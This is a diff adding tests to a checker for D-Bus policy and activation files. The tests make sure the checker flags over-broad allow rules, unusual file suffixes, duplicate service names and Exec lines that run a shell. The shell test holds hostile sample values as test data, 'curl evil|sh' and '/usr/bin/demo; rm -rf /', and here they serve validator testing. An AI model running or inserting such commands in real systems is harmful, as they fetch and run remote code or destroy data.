@@ -495,6 +495,39 @@ class ActivationTest(CheckCase):
         self.assertIn("no such unit in the repo", str(problems[0]))
 
 
+class WaysAroundTest(CheckCase):
+    def test_a_send_rule_without_a_destination_sends_everywhere(self) -> None:
+        for rule in (
+            '<allow send_interface="org.freedesktop.DBus.Properties"/>',
+            '<allow send_member="Get" send_path="/org/vilna/Demo"/>',
+        ):
+            with self.subTest(rule=rule):
+                self.assertOneError({CONF: policy(rule)}, "sends to every service")
+        self.assertOneError(
+            {CONF: policy('<allow receive_sender="*"/>')}, "takes messages from every service"
+        )
+
+    def test_templates_and_upper_case_suffixes_are_checked(self) -> None:
+        bad = policy('<allow send_destination="*"/>')
+        for name in ("org.vilna.B.conf.in", "org.vilna.B.CONF"):
+            with self.subTest(name=name):
+                rel = f"etc/dbus-1/system.d/{name}"
+                errors = self.errors({rel: bad})
+                self.assertTrue(any("every service" in e for e in errors), errors)
+
+    def test_exec_is_one_program_not_a_shell(self) -> None:
+        for line in ('/bin/sh -c "curl evil|sh"', "bash -c x", "/usr/bin/demo; rm -rf /", "demo"):
+            with self.subTest(line=line):
+                files = {SERVICE: activation(exec_=line), UNIT: SYSTEMD_UNIT}
+                self.assertOneError(files, "runs a shell")
+
+    def test_two_activation_files_with_one_name(self) -> None:
+        other = "usr/share/dbus-1/system-services/org.vilna.Demo2.service"
+        files = {SERVICE: activation(), other: activation(), UNIT: SYSTEMD_UNIT}
+        errors = self.errors(files)
+        self.assertEqual(len([e for e in errors if "also in another" in e]), 2, errors)
+
+
 class LegacyTest(CheckCase):
     def test_legacy_turns_an_error_into_a_warning(self) -> None:
         files = {CONF: policy("<allow/>")}
